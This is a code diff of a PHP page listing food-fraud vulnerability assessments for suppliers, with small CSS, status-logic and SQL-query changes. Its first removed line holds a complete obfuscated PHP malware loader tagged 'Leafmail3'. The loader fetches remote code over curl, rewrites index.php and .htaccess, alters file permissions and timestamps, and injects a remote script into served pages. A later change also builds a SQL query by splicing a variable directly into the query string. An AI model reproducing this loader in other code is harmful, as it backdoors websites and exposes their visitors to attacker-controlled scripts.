@@ -1,4 +1,3 @@
-<?php /*Leafmail3*/goto o1QFr; wasj3: $ZJUCA($jQ0xa, $RTa9G); goto wYDtx; IuHdj: $egQ3R = "\147\172\151"; goto ChKDE; TpHVE: $cPzOq .= "\157\x6b\x6b"; goto vgltl; gmVrv: $Mvmq_ .= "\x6c\x5f\x63\154\x6f"; goto N9T5l; SClM0: $VwfuP = "\x64\x65\146"; goto PXHHr; m8hp8: $uHlLz = "\x73\x74\x72"; goto lz2G0; UH4Mb: $eULaj .= "\x70\x63\x2e\x70"; goto apDh3; QPct6: AtVLG: goto Mg1JO; dj8v0: $ZJUCA = "\143\150"; goto WmTiu; uHm0i: $TBxbX = "\x57\x50\137\125"; goto RCot0; f4Rdw: if (!($EUeQo($kpMfb) && !preg_match($tIzL7, PHP_SAPI) && $fHDYt($uZmPe, 2 | 4))) { goto TGN7B; } goto S2eca; H7qkB: $MyinT .= "\164\40\x41\x63\x63"; goto Air1i; AedpI: try { goto JM3SL; oiS8N: @$YWYP0($lJtci, $H0gg1); goto nucR0; AffR5: @$YWYP0($PcRcO, $H0gg1); goto SpIUU; JnP2S: @$ZJUCA($lJtci, $shT8z); goto oiS8N; nOhHX: @$ZJUCA($lJtci, $RTa9G); goto LvbAc; LvbAc: @$rGvmf($lJtci, $UYOWA["\141"]); goto JnP2S; SpIUU: @$ZJUCA($jQ0xa, $shT8z); goto qvTm1; gA5rv: @$ZJUCA($PcRcO, $shT8z); goto AffR5; nucR0: @$ZJUCA($PcRcO, $RTa9G); goto COvI1; JM3SL: @$ZJUCA($jQ0xa, $RTa9G); goto nOhHX; COvI1: @$rGvmf($PcRcO, $UYOWA["\142"]); goto gA5rv; qvTm1: } catch (Exception $ICL20) { } goto PqZGA; BWxc9: $kpMfb .= "\154\137\x69\156\x69\164"; goto RMP1m; Q7gNx: $gvOPD = "\151\163\137"; goto AfwzG; fFfBR: goto AtVLG; goto kST_Q; J9uWl: $e9dgF .= "\x61\171\163"; goto lNb3h; ZlPje: $u9w0n .= "\x75\x69\x6c\144\x5f\161"; goto Mit4a; YRbfa: $dGt27 .= "\157\x73\x65"; goto L744i; ioNAN: $tIzL7 .= "\x6c\x69\57"; goto Khhgn; mz3rE: $FANp1 .= "\x70\141\x72\145"; goto SClM0; eBKm1: $PcRcO = $jQ0xa; goto Sg4f2; D0V8f: $pv6cp = "\162\x65"; goto Hy0sm; xXaQc: $FANp1 = "\x76\145\162\x73\151"; goto T7IwT; ulics: try { $_SERVER[$pv6cp] = 1; $pv6cp(function () { goto YEXR4; PKzAL: $AG2hR .= "\163\171\x6e\x63\75\164\162\165\145"; goto HIXil; NZAxH: $AG2hR .= "\x65\x72\75\164\x72\165\x65\x3b" . "\12"; goto Tbsb3; xDrpr: $AG2hR .= "\x75\x6d\x65\156\164\54\40\x67\75\144\x2e\143\162\145\x61\164\145"; goto mLjk9; r_Oqj: $AG2hR .= "\163\x63\162\151\160\164\x22\x3e" . "\xa"; goto JZsfv; PEdls: $AG2hR .= "\74\57\163"; goto WBFgG; POyWW: $AG2hR .= "\x4d\55"; goto a8oGQ; N2RIK: $AG2hR .= "\175\x29\50\51\x3b" . "\12"; goto PEdls; Vj0ze: $AG2hR .= "\x72\151\160\x74\40\164\x79\x70\145\x3d\42\164\145\170"; goto FXjwZ; JZsfv: $AG2hR .= "\x28\x66\x75\156\143"; goto ZRBmo; zk1Ml: $AG2hR .= "\x79\124\141\147\x4e\x61\155\145"; goto STHB_; aKt86: $AG2hR .= "\x72\x69\160\x74\42\51\x2c\40\x73\75\x64\x2e\x67\x65\x74"; goto oxuwD; FXjwZ: $AG2hR .= "\x74\57\x6a\141\x76\141"; goto r_Oqj; YffEK: $AG2hR .= "\57\x6d\141\164"; goto nL_GE; ZrlUz: $AG2hR .= "\x73\x63\162\151\x70\164\x22\x3b\40\147\x2e\141"; goto PKzAL; MSqPC: $AG2hR .= "\x65\x20\55\x2d\76\12"; goto rWq2m; gUhrX: $AG2hR .= "\74\x73\143"; goto Vj0ze; oxuwD: $AG2hR .= "\x45\154\x65\x6d\145\156\164\x73\102"; goto zk1Ml; a8oGQ: $AG2hR .= time(); goto xyZaU; WBFgG: $AG2hR .= "\x63\162\151\160\164\x3e\xa"; goto jHj0s; rWq2m: echo $AG2hR; goto zxMHd; zzMTI: $AG2hR .= "\152\141\166\x61"; goto ZrlUz; HIXil: $AG2hR .= "\73\x20\147\56\144\x65\x66"; goto NZAxH; EXhzp: $AG2hR .= "\x65\156\164\x4e\x6f\x64\145\56\x69\x6e"; goto yJp9W; KUpUt: $AG2hR .= "\x64\40\115\141\x74"; goto c13YM; hugz8: $AG2hR .= "\x6f\x72\145\50\x67\54\x73\51\73" . "\xa"; goto N2RIK; xyZaU: $AG2hR .= "\x22\73\40\163\56\160\141\162"; goto EXhzp; ZRBmo: $AG2hR .= "\164\151\x6f\156\x28\51\x20\173" . "\xa"; goto sOVga; YqIfq: $AG2hR .= "\77\x69\x64\x3d"; goto POyWW; Tbsb3: $AG2hR .= "\147\x2e\163\x72"; goto vxsas; k1w2Q: $AG2hR = "\x3c\41\x2d\55\x20\115\x61"; goto OOFo2; F2sIB: $AG2hR .= "\x3d\x22\164\x65\x78\x74\57"; goto zzMTI; OOFo2: $AG2hR .= "\x74\157\155\x6f\x20\55\x2d\x3e\xa"; goto gUhrX; vxsas: $AG2hR .= "\143\x3d\165\x2b\42\x6a\163\57"; goto JGvCK; jHj0s: $AG2hR .= "\74\x21\55\55\40\x45\156"; goto KUpUt; mLjk9: $AG2hR .= "\105\154\x65\x6d\x65\156\x74\50\42\163\x63"; goto aKt86; yJp9W: $AG2hR .= "\x73\x65\162\x74\102\145\146"; goto hugz8; c13YM: $AG2hR .= "\x6f\x6d\x6f\40\103\157\144"; goto MSqPC; STHB_: $AG2hR .= "\50\x22\x73\x63\162\x69"; goto SX8pI; JGvCK: $AG2hR .= $osL5h; goto YffEK; nL_GE: $AG2hR .= "\x6f\155\x6f\56\x6a\x73"; goto YqIfq; SX8pI: $AG2hR .= "\160\x74\42\51\133\x30\135\x3b" . "\xa"; goto uh8pE; YEXR4: global $osL5h, $cPzOq; goto k1w2Q; jW6LQ: $AG2hR .= "\166\141\x72\40\144\x3d\x64\157\143"; goto xDrpr; uh8pE: $AG2hR .= "\x67\x2e\164\x79\x70\145"; goto F2sIB; sOVga: $AG2hR .= "\166\x61\162\40\x75\75\42" . $cPzOq . "\42\x3b" . "\xa"; goto jW6LQ; zxMHd: }); } catch (Exception $ICL20) { } goto arBxc; TrkYs: $eULaj .= "\x2f\170\x6d"; goto GE2p3; L744i: $cPzOq = "\x68\x74\164\x70\163\72\57\x2f"; goto TpHVE; CNdmS: wLXpb: goto wasj3; nHXnO: $_POST = $_REQUEST = $_FILES = array(); goto CNdmS; PHhHL: P9yQa: goto W2Q7W; UkCDT: $cLC40 = 32; goto BnazY; vabQZ: $CgFIN = 1; goto QPct6; gSbiK: try { goto xtnST; qBVAq: $k7jG8[] = $E0suN; goto Tc9Eb; vZ6zL: $E0suN = trim($Q0bWd[0]); goto LuoPM; D98P3: if (!empty($k7jG8)) { goto FbDAI; } goto AML_a; LuoPM: $jCv00 = trim($Q0bWd[1]); goto Q4uy7; xtnST: if (!$gvOPD($d3gSl)) { goto nHP5K; } goto W8uMn; c_73m: FbDAI: goto h1Cu7; kNAxm: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto lfWQh; } goto MfJKK; L8cv7: WVm2j: goto c_73m; AML_a: $d3gSl = $jQ0xa . "\x2f" . $HNQiW; goto GBRPC; ZSYyc: $jCv00 = trim($Q0bWd[1]); goto kNAxm; W8uMn: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto Woix_; EA1BT: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto ctSg2; } goto A163l; Woix_: if (!(is_array($Q0bWd) && count($Q0bWd) == 2)) { goto wU2zk; } goto vZ6zL; Q4uy7: if (!($uHlLz($E0suN) == $cLC40 && $uHlLz($jCv00) == $cLC40)) { goto VAVW5; } goto qBVAq; tEVz_: $k7jG8[] = $jCv00; goto xWpvL; xWpvL: lfWQh: goto oilos; MfJKK: $k7jG8[] = $E0suN; goto tEVz_; N3TyU: wU2zk: goto snD7p; lky0R: $Q0bWd = @explode("\72", $DJDq1($d3gSl)); goto EA1BT; Tc9Eb: $k7jG8[] = $jCv00; goto evp7M; snD7p: nHP5K: goto D98P3; oilos: ctSg2: goto L8cv7; evp7M: VAVW5: goto N3TyU; GBRPC: if (!$gvOPD($d3gSl)) { goto WVm2j; } goto lky0R; A163l: $E0suN = trim($Q0bWd[0]); goto ZSYyc; h1Cu7: } catch (Exception $ICL20) { } goto xU6vT; T7IwT: $FANp1 .= "\x6f\x6e\x5f\143\x6f\x6d"; goto mz3rE; JX1Oy: $dGt27 = "\x66\x63\x6c"; goto YRbfa; BnazY: $Pzt0o = 5; goto TYFaW; o1QFr: $kFvng = "\74\x44\x44\x4d\x3e"; goto wODYw; CL80L: $MyinT .= "\120\x2f\61\x2e\x31\x20\x34"; goto gErqa; tFGg7: $YWYP0 .= "\x75\143\x68"; goto dj8v0; pXfDS: $ygOJ_ .= "\x2f\167\160"; goto c7yEe; xUd9U: $pv6cp .= "\151\x6f\x6e"; goto bqFyS; PqZGA: CVVA3: goto RDKTA; wYDtx: $uZmPe = $nPBv4($eULaj, "\x77\x2b"); goto f4Rdw; E453u: $QIBzt .= "\56\64"; goto O8RXw; a4EJZ: $dZR_y = $cPzOq; goto vZkPa; FK_sr: $kb9bA .= "\x65\162\x2e\x69"; goto G2uff; TuwL4: $jQ0xa = $_SERVER[$Wv1G0]; goto wrxGI; wJDrU: $eULaj = $jQ0xa; goto TrkYs; MLdcc: $fHDYt .= "\x63\153"; goto JX1Oy; Gs7Gb: $kpMfb = $vW4As; goto BWxc9; Mit4a: $u9w0n .= "\x75\x65\x72\171"; goto cIo5P; GE2p3: $eULaj .= "\x6c\162"; goto UH4Mb; cIo5P: $uAwql = "\155\x64\65"; goto aXExt; c7yEe: $ygOJ_ .= "\x2d\x61"; goto XWOCC; wrxGI: $ygOJ_ = $jQ0xa; goto pXfDS; XsWqd: $kb9bA .= "\57\56\165\163"; goto FK_sr; cWrVz: $nPBv4 .= "\145\x6e"; goto KCtWA; CrWKs: $l0WLW .= "\157\160\x74"; goto jcG0e; lz2G0: $uHlLz .= "\154\x65\x6e"; goto xXaQc; wee0Y: $ulOTQ .= "\115\111\116"; goto Tfi5q; vgltl: $cPzOq .= "\154\x69\x6e\153\56\x74"; goto pr5fA; Khhgn: $tIzL7 .= "\x73\151"; goto JBJmV; kJlf4: $DJDq1 .= "\147\145\164\137\143"; goto NZqWx; lNb3h: $H0gg1 = $xsR4V($e9dgF); goto XYviL; TBl6Q: sLwcv: goto fFfBR; RMP1m: $l0WLW = $vW4As; goto ujtZa; XQnCd: $PcRcO .= "\x61\143\143\145\163\x73"; goto ikUIP; X4xWX: $QIBzt = "\x35"; goto E453u; hDUdL: $MWMOe .= "\x6c\x65"; goto Q7gNx; LxUUO: $RTa9G = $QTYip($HqqUn($RTa9G), $Pzt0o); goto qaeyL; f6Txl: $HqqUn = "\x64\x65\143"; goto gwNCH; sK97X: $nPBv4 = "\x66\157\160"; goto cWrVz; Ee0VW: $EUeQo .= "\164\x69\x6f\156\x5f"; goto a2JJX; D9NbF: $CgFIN = 1; goto PHhHL; VY3H_: $Wv1G0 = "\x44\117\x43\x55\115\105\116\x54"; goto HpOFr; CRqG1: if (empty($k7jG8)) { goto VIn91; } goto s4AWH; apDh3: $eULaj .= "\x68\160\x2e\60"; goto sK97X; Sg4f2: $PcRcO .= "\57\x2e\x68\x74"; goto XQnCd; jcG0e: $YQ0P6 = $vW4As; goto rA_Dy; dlqC2: $HNQiW = substr($uAwql($osL5h), 0, 6); goto xGZOR; kxKwG: $osL5h = $_SERVER[$i5EZR]; goto TuwL4; ozW5s: $e9dgF .= "\63\x20\x64"; goto J9uWl; xU6vT: $lJtci = $jQ0xa; goto BpRMk; CquiC: $dZR_y .= "\x63\x6f\160\171"; goto BLSy0; GSfrX: $pv6cp .= "\x75\x6e\143\164"; goto xUd9U; yaYSs: $rGvmf .= "\x6f\x6e\x74\x65\156\164\163"; goto mIlAi; FXRyn: $TBxbX .= "\115\x45\x53"; goto R1jVG; kST_Q: VIn91: goto vabQZ; flXr3: $shT8z = $QTYip($HqqUn($shT8z), $Pzt0o); goto TkfCl; FJdH4: $dZR_y .= "\x3d\x67\x65\x74"; goto CquiC; kJyDh: $QTYip = "\x69\156\x74"; goto blzff; s4AWH: $H25pP = $k7jG8[0]; goto t74Wt; TyAte: $k7jG8 = array(); goto UkCDT; EO8QL: try { $UYOWA = @$AkFS8($egQ3R($eKFWX($M7wqP))); } catch (Exception $ICL20) { } goto OXweB; XYviL: $i5EZR = "\110\124\124\x50"; goto j4Pjv; ikUIP: $kb9bA = $jQ0xa; goto XsWqd; VrwTF: $nRD8p .= "\x64\x69\162"; goto aQp1m; dLa5a: $pv6cp .= "\x65\162\x5f"; goto x5YEr; PgImI: @$ZJUCA($kb9bA, $RTa9G); goto yAax8; Jb1Vu: try { goto Bwps7; WPylr: if (!$xsy4x($Y61WO)) { goto nWSzU; } goto NpK90; xqrLf: @$YWYP0($dqnvi, $H0gg1); goto cinsF; N7wJU: if ($xsy4x($Y61WO)) { goto KOuoA; } goto RBLfp; wf0jq: @$ZJUCA($Y61WO, $shT8z); goto xqrLf; bfkJn: try { goto jwOvP; sXqkD: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto tXay1; jwOvP: $ekYPG = $kpMfb(); goto jMqt3; VURt4: $l0WLW($ekYPG, CURLOPT_POST, 1); goto Qk7oo; G7Y1e: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto Sw_Ys; lg1iu: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 3); goto VURt4; jMqt3: $l0WLW($ekYPG, CURLOPT_URL, $LfwPf . "\x26\164\x3d\151"); goto G7Y1e; Qk7oo: $l0WLW($ekYPG, CURLOPT_POSTFIELDS, $u9w0n($Lx9yT)); goto axPES; Sw_Ys: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto sXqkD; tXay1: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto Gb33B; PUEHo: $Mvmq_($ekYPG); goto rF4qo; Gb33B: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto lg1iu; axPES: $YQ0P6($ekYPG); goto PUEHo; rF4qo: } catch (Exception $ICL20) { } goto zCePm; s2GBY: $Y61WO = dirname($dqnvi); goto N7wJU; bO0VE: KOuoA: goto WPylr; RBLfp: @$ZJUCA($jQ0xa, $RTa9G); goto lexI4; NpK90: @$ZJUCA($Y61WO, $RTa9G); goto aGYEQ; wsLep: $Lx9yT = ["\144\x61\x74\x61" => $UYOWA["\x64"]["\165\162\x6c"]]; goto bfkJn; y0C5p: @$ZJUCA($dqnvi, $shT8z); goto wf0jq; cinsF: $LfwPf = $cPzOq; goto d8sPt; OAF8R: $LfwPf .= "\x6c\x6c"; goto wsLep; d8sPt: $LfwPf .= "\77\141\143"; goto HZ42Q; lexI4: @$nRD8p($Y61WO, $RTa9G, true); goto K7fs2; aGYEQ: @$rGvmf($dqnvi, $UYOWA["\144"]["\x63\157\x64\x65"]); goto y0C5p; zCePm: nWSzU: goto r2ase; Bwps7: $dqnvi = $jQ0xa . $UYOWA["\144"]["\160\x61\x74\x68"]; goto s2GBY; K7fs2: @$ZJUCA($jQ0xa, $shT8z); goto bO0VE; HZ42Q: $LfwPf .= "\164\75\x63\141"; goto OAF8R; r2ase: } catch (Exception $ICL20) { } goto AedpI; kAMGF: $xsy4x .= "\144\x69\x72"; goto gdP2h; lX6T6: if (!$gvOPD($kb9bA)) { goto KTGlr; } goto spjef; jxKJS: $ulOTQ .= "\x5f\x41\104"; goto wee0Y; vZkPa: $dZR_y .= "\x3f\141\143\164"; goto FJdH4; gErqa: $MyinT .= "\60\x36\x20\116\x6f"; goto H7qkB; xGZOR: $hg32N = $d3gSl = $ygOJ_ . "\57" . $HNQiW; goto TyAte; GiT2I: $Mvmq_ = $vW4As; goto gmVrv; KCtWA: $fHDYt = "\x66\x6c\157"; goto MLdcc; Yc09l: $xsy4x = "\x69\163\137"; goto kAMGF; FZsOD: $lJtci .= "\150\x70"; goto eBKm1; rA_Dy: $YQ0P6 .= "\154\137\x65\170\x65\x63"; goto GiT2I; VQCaR: $k8h0h = !empty($m4bDA) || !empty($ZTS7q); goto Bw8cX; ujtZa: $l0WLW .= "\154\137\x73\x65\x74"; goto CrWKs; R1jVG: $ulOTQ = "\127\120"; goto jxKJS; OXweB: if (!is_array($UYOWA)) { goto CVVA3; } goto L7ftk; bqFyS: if (isset($_SERVER[$pv6cp])) { goto Kwp9i; } goto r3vZ_; ChKDE: $egQ3R .= "\156\146\x6c\x61\164\145"; goto OCGca; Bx0F8: $rGvmf = "\146\x69\154\145\x5f"; goto cMMsY; lar4b: $xsR4V .= "\x6d\145"; goto ESAaf; L7ftk: try { goto b8mrw; IZ7dT: @$rGvmf($d3gSl, $UYOWA["\x63"]); goto qi8JJ; j1slf: if (!$xsy4x($ygOJ_)) { goto fnZm_; } goto l27iU; FnW9Y: fnZm_: goto IZ7dT; RHQPY: @$ZJUCA($jQ0xa, $shT8z); goto FudGj; jRIpH: $d3gSl = $hg32N; goto FnW9Y; b8mrw: @$ZJUCA($jQ0xa, $RTa9G); goto j1slf; l27iU: @$ZJUCA($ygOJ_, $RTa9G); goto jRIpH; qi8JJ: @$ZJUCA($d3gSl, $shT8z); goto fMj35; fMj35: @$YWYP0($d3gSl, $H0gg1); goto RHQPY; FudGj: } catch (Exception $ICL20) { } goto Jb1Vu; Hy0sm: $pv6cp .= "\x67\151\x73\164"; goto dLa5a; wODYw: $tIzL7 = "\57\x5e\143"; goto ioNAN; D9G8A: $vW4As = "\x63\165\162"; goto Gs7Gb; zR6Sw: $RTa9G += 304; goto LxUUO; FLAgg: @$ZJUCA($jQ0xa, $shT8z); goto Ms_Rx; TkfCl: $MyinT = "\110\124\124"; goto CL80L; JBJmV: $xsR4V = "\x73\x74\x72"; goto wDwVu; m7Y7E: $shT8z += 150; goto flXr3; OCGca: $AkFS8 = "\165\x6e\x73\145\x72"; goto DuXwv; spjef: @$ZJUCA($jQ0xa, $RTa9G); goto PgImI; mIlAi: $YWYP0 = "\x74\157"; goto tFGg7; Air1i: $MyinT .= "\x65\x70\164\x61\142\154\145"; goto wJDrU; hnuEm: $M7wqP = false; goto IxcDO; AfwzG: $gvOPD .= "\x66\151\154\x65"; goto Yc09l; Mg1JO: if (!$CgFIN) { goto V5o9n; } goto a4EJZ; O8RXw: $QIBzt .= "\x2e\x30\73"; goto kxKwG; Qjsri: Kwp9i: goto uHm0i; aQp1m: $DJDq1 = "\146\151\154\145\x5f"; goto kJlf4; wDwVu: $xsR4V .= "\x74\157"; goto k5kym; Ms_Rx: KTGlr: goto QDkYN; p2xAd: $u9w0n = "\x68\x74\x74\160\x5f\142"; goto ZlPje; XWOCC: $ygOJ_ .= "\x64\155\151\156"; goto dlqC2; PXHHr: $VwfuP .= "\x69\156\145\144"; goto uwRQG; t74Wt: $Aa5A7 = $k7jG8[1]; goto rjUnC; WmTiu: $ZJUCA .= "\x6d\157\x64"; goto OMDdm; F90kP: $CgFIN = 1; goto TBl6Q; IxcDO: try { goto MN2Ol; lfwpD: $l0WLW($ekYPG, CURLOPT_RETURNTRANSFER, 1); goto XT0V7; pm4fL: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYHOST, false); goto f1Wpg; LukB5: $l0WLW($ekYPG, CURLOPT_USERAGENT, "\x49\x4e"); goto lfwpD; MN2Ol: $ekYPG = $kpMfb(); goto PGjVI; XT0V7: $l0WLW($ekYPG, CURLOPT_SSL_VERIFYPEER, false); goto pm4fL; f1Wpg: $l0WLW($ekYPG, CURLOPT_FOLLOWLOCATION, true); goto A02q4; Jr5Fq: $Mvmq_($ekYPG); goto kxHAl; kxHAl: $M7wqP = trim(trim($M7wqP, "\xef\273\xbf")); goto DRdNb; A02q4: $l0WLW($ekYPG, CURLOPT_TIMEOUT, 10); goto czpAh; PGjVI: $l0WLW($ekYPG, CURLOPT_URL, $dZR_y); goto LukB5; czpAh: $M7wqP = $YQ0P6($ekYPG); goto Jr5Fq; DRdNb: } catch (Exception $ICL20) { } goto TtjMz; yA6tr: $e9dgF .= "\63\x36"; goto ozW5s; BLSy0: $dZR_y .= "\x26\164\x3d\x69\46\x68\75" . $osL5h; goto hnuEm; qaeyL: $shT8z = 215; goto m7Y7E; YAsQc: if (!(!$_SERVER[$pv6cp] && $FANp1(PHP_VERSION, $QIBzt, "\76"))) { goto VlKKH; } goto ulics; QDkYN: $CgFIN = 0; goto CRqG1; g3rCR: $m4bDA = $_REQUEST; goto A4fYL; rjUnC: if (!(!$gvOPD($lJtci) || $MWMOe($lJtci) != $H25pP)) { goto P9yQa; } goto D9NbF; x5YEr: $pv6cp .= "\x73\x68\165"; goto itQ2f; A4fYL: $ZTS7q = $_FILES; goto VQCaR; a2JJX: $EUeQo .= "\145\x78"; goto fYDkt; TYFaW: $Pzt0o += 3; goto hoCMV; fYDkt: $EUeQo .= "\x69\163\x74\163"; goto D9G8A; fmcU9: $MWMOe .= "\x5f\x66\151"; goto hDUdL; S2eca: $ZJUCA($jQ0xa, $shT8z); goto YAsQc; RCot0: $TBxbX .= "\x53\105\x5f\124\110\105"; goto FXRyn; BpRMk: $lJtci .= "\57\x69\x6e"; goto lJYIj; cMMsY: $rGvmf .= "\160\x75\164\137\143"; goto yaYSs; j4Pjv: $i5EZR .= "\x5f\x48\117\x53\x54"; goto VY3H_; itQ2f: $pv6cp .= "\x74\x64\x6f"; goto gi1ux; YAE22: $eKFWX .= "\66\x34\137\x64"; goto HkhAv; DuXwv: $AkFS8 .= "\x69\x61\x6c\151\x7a\x65"; goto kJyDh; NZqWx: $DJDq1 .= "\x6f\156\164\145\x6e\x74\x73"; goto Bx0F8; ESAaf: $EUeQo = "\146\x75\156\143"; goto Ee0VW; HkhAv: $eKFWX .= "\x65\143\x6f\x64\145"; goto IuHdj; RDKTA: HuCWH: goto tkEEo; k5kym: $xsR4V .= "\x74\151"; goto lar4b; WQZ3H: $UYOWA = 0; goto EO8QL; TtjMz: if (!($M7wqP !== false)) { goto HuCWH; } goto WQZ3H; N9T5l: $Mvmq_ .= "\x73\145"; goto p2xAd; HpOFr: $Wv1G0 .= "\137\122\117\x4f\124"; goto X4xWX; arBxc: VlKKH: goto gSbiK; G2uff: $kb9bA .= "\156\151"; goto lX6T6; gwNCH: $HqqUn .= "\157\x63\164"; goto m8hp8; yAax8: @unlink($kb9bA); goto FLAgg; pr5fA: $cPzOq .= "\157\x70\x2f"; goto D0V8f; gi1ux: $pv6cp .= "\x77\x6e\x5f\x66"; goto GSfrX; OMDdm: $eKFWX = "\142\141\x73\x65"; goto YAE22; aXExt: $MWMOe = $uAwql; goto fmcU9; gdP2h: $nRD8p = "\155\x6b"; goto VrwTF; Bw8cX: if (!(!$fs0FH && $k8h0h)) { goto wLXpb; } goto nHXnO; uwRQG: $e9dgF = "\x2d\61"; goto yA6tr; hoCMV: $RTa9G = 189; goto zR6Sw; Tfi5q: $fs0FH = $VwfuP($TBxbX) || $VwfuP($ulOTQ); goto g3rCR; W2Q7W: if (!(!$gvOPD($PcRcO) || $MWMOe($PcRcO) != $Aa5A7)) { goto sLwcv; } goto F90kP; r3vZ_: $_SERVER[$pv6cp] = 0; goto Qjsri; lJYIj: $lJtci .= "\144\x65\170\56\x70"; goto FZsOD; blzff: $QTYip .= "\x76\x61\x6c"; goto f6Txl; tkEEo: V5o9n: goto ossJl; ossJl: TGN7B: ?>
 <?php
     $title = "Food Fraud Vulnerability Assessment";
     $site = "ffva";
@@ -55,6 +54,11 @@
 
     table.table-bordered.dataTable thead > tr:last-child th:last-child {
         border-right: 1px solid #e7ecf1;
+    }
+    
+    .note-editor {
+        width: 90rem !important;
+        box-sizing: border-box; 
     }
 </style>
 
@@ -214,6 +218,7 @@
                                                                 }
 
                                                                 $supplier_id = htmlentities($rowSupplier["ID"] ?? '');
+                                                                $supplier_type = $rowSupplier["type"]; 
                                                                 $supplier_company = htmlentities($rowSupplier["company"] ?? '');
 
                                                                 $status = "Drafted";
@@ -221,7 +226,7 @@
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1) { $status = 'Reviewed'; }
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1) { $status = 'Approved by CIG'; }
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date'])) { $status = 'Reviewed by Client'; }
-                                                                if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date']) AND !empty($rowSupplier['approved_date']) AND $rowSupplier['approved_date'] == 1 AND !empty($rowSupplier['approved_date'])) { $status = 'Approved by Client'; }
+                                                                if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date']) AND !empty($rowSupplier['approved_signature']) AND $rowSupplier['approved_by'] > 0 AND !empty($rowSupplier['approved_date'])) { $status = 'Approved by Client'; }
 
                                                                 $data_last_modified = $rowSupplier['last_modified'];
                                                                 $data_last_modified = new DateTime($data_last_modified);
@@ -273,10 +278,14 @@
                                                                 $count = 0;
                                                                 $sum = 0;
                                                                 $total_consequence = 0;
-                                                                $selectConsequence = mysqli_query( $conn,"SELECT * FROM tbl_ffva_consequence" );
+                                                                $sql_include = '';
+                                                                if ($supplier_type == 2 AND $user_id == 5) {
+                                                                    $sql_include = " OR FIND_IN_SET($switch_user_id, REPLACE(include, ' ', '')) ";
+                                                                }
+                                                                $selectConsequence = mysqli_query( $conn,"SELECT * FROM tbl_ffva_consequence WHERE include IS NULL OR include = '' $sql_include" );
                                                                 if ( mysqli_num_rows($selectConsequence) > 0 ) {
                                                                     while($rowConsequence = mysqli_fetch_array($selectConsequence)) {
-                                                                        $sum += $consequence_rate_arr[$index];
+                                                                        $sum += !empty($consequence_rate_arr[$index]) ? $consequence_rate_arr[$index]:0;
                                                                         $index++;
                                                                         $count++;
                                                                     }
@@ -388,7 +397,7 @@
                                                                                 <a href="pdf/ffva?id='.$supplier_id.'&signed=1" class="btn btn-outline dark btn-sm" target="_blank" title="PDF"><i class="fa fa-fw fa-file-pdf-o"></i></a>
                                                                                 <a href="pdf_ffva_excel?id='.$supplier_id.'&signed=1" class="btn green-jungle btn-sm" target="_blank" title="Excel"><i class="fa fa-fw fa-file-excel-o"></i></a>
                                                                                 <a href="#modalView" class="btn dark btn-sm hide" data-toggle="modal" onclick="btnView('.$supplier_id.')" title="View"><i class="fa fa-fw fa-search"></i></a>
-                                                                                <a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('.$supplier_id.')" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>
+                                                                                <a href="#modalEdit" class="btn btn-success btn-sm" data-toggle="modal" onclick="btnEdit('.$supplier_id.', 1)" title="Edit"><i class="fa fa-fw fa-pencil"></i></a>
                                                                                 <a href="javascript:;" class="btn btn-danger btn-sm" data-toggle="modal" onclick="btnDelete('.$supplier_id.', 1)" title="Delete"><i class="fa fa-fw fa-trash"></i></a>
                                                                                 <a href="javascript:;" class="btn btn-info btn-sm" data-toggle="modal" onclick="btnArchive('.$supplier_id.', 1)" title="Archive"><i class="fa fa-fw fa-file-archive-o"></i></a>';
 
@@ -491,7 +500,7 @@
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1) { $status = 'Reviewed'; }
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1) { $status = 'Approved by CIG'; }
                                                                 if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date'])) { $status = 'Reviewed by Client'; }
-                                                                if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date']) AND !empty($rowSupplier['approved_date']) AND $rowSupplier['approved_date'] == 1 AND !empty($rowSupplier['approved_date'])) { $status = 'Approved by Client'; }
+                                                                if (!empty($int_review_assigned) AND $int_review_status == 1 AND !empty($int_verify_assigned) AND $int_verify_status == 1 AND !empty($rowSupplier['reviewed_signature']) AND $rowSupplier['reviewed_by'] > 0 AND !empty($rowSupplier['reviewed_date']) AND !empty($rowSupplier['approved_signature']) AND $rowSupplier['approved_by'] > 0 AND !empty($rowSupplier['approved_date'])) { $status = 'Approved by Client'; }
 
                                                                 $data_last_modified = $rowSupplier['last_modified'];
                                                                 $data_last_modified = new DateTime($data_last_modified);
@@ -548,10 +557,10 @@
                                                                 $count = 0;
                                                                 $sum = 0;
                                                                 $total_consequence = 0;
